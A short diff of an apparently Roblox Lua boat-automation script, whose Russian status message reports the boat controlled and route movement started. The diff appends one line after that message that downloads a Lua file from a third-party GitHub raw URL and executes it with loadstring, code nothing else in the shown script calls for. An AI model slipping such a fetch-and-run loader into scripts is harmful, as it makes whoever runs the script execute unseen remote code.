@@ -175,3 +175,4 @@ task.spawn(function()
 end)
 
 print("Лодка управляется, возврат на сиденье активен, движение по маршруту запущено")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
